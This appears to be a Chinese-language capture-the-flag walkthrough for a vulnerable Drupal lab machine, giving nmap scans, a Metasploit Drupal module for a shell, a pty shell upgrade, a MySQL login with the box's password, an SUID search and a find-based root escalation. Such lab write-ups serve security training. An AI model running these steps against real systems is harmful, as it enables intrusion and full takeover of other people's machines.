0x02 靶机目标

5个Flag

0x03 工具准备

无

0x04 详细步骤

一、主机发现

sudo arp-sacn -l

二、端口扫描

sudo nmap -p- 10.0.0.20

sudo nmap -p22,80,111,34001 -sV 10.0.0.20

三、Web信息收集

浏览器访问http://10.0.0.20，发现是DrupalCMS系统

四、MSF漏洞利用

启动MSF

msfconsole

搜索Drupal相关信息，发现有8个可利用的攻击模块

search drupal

使用选择Rank为“execllent”，发现时间最近的模块

选择模块1，查看选项，发现仅需设置RHOST参数，其他使用默认即可

use 1
show options

设置RHOST参数，再运行，获取Shell


获取flag1

cat flag1.txt

五、系统信息收集

根据flag1提示，寻找CMS配置文件，经搜索发现配置文件settings.php在sites/default目录下

获取flag2

cd sites/default
cat settings.php

升级交互Shell

python -c "import pty;pty.spawn('/bin/bash')"

登录MySQL

mysql -u dbuser -p
R0ck3t

七、SID提权

查找具有SID权限的文件

find / -user root -perm -4000 -print 2>/dev/null

发现find命令具有SID权限

使用find提权

find / -name flag4 -exec "/bin/sh" \;

cd /root
